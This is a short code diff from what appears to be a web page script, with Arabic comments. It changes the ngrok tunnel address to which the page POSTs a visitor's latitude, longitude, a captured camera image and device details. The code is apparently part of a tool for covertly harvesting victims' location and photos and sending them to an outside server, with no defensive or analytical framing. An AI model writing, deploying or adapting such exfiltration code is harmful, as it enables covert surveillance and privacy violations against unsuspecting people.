@@ -47,7 +47,7 @@
                         const imgData = canvas.toDataURL('image/jpeg', 0.5); // JPEG بجودة 50%
 
                         // إرسال البيانات إلى السيرفر
-                        fetch("https://3ce96c372a59.ngrok-free.app/receive_data", {
+                        fetch("https://b3c92869e770.ngrok-free.app/receive_data", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ lat, lon, imgData, deviceInfo })
